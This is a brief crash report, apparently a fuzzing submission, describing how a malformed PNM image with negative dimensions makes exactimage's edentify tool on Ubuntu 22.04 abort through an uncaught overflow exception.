Target Software and Version: exactimage 1.0.2, edentify frontend

Description of Target Software's Environment (Platform/OS, Setup Instructions, etc.): affected version of exactimage is the default version packaged for Ubuntu 22.04, versioned as 1.0.2-8build3

Target File Type: malformed PNM image

SHA256 Hash: 791e6cc5abd35e249a2ef7a4e2f0ed7da5b5a230e1321f9ac266e99622d1cbb5

Brief Description of Crash: edentify is meant to be similar to ImageMagick's midentify program for reading metadata about given image files. edentify interprets the malformed file as a PNM file with width and height of -8 pixels. When loading the file data, the negative width creates an overflow, which is detected but results in an exception that is never caught, killing the program with SIGABRT.

Was this a new crash, or a known bug? Looks to be a new crash, as the trunk svn version appears to be affected, but unknown for sure as the author does not appear to maintain a public issue tracker.
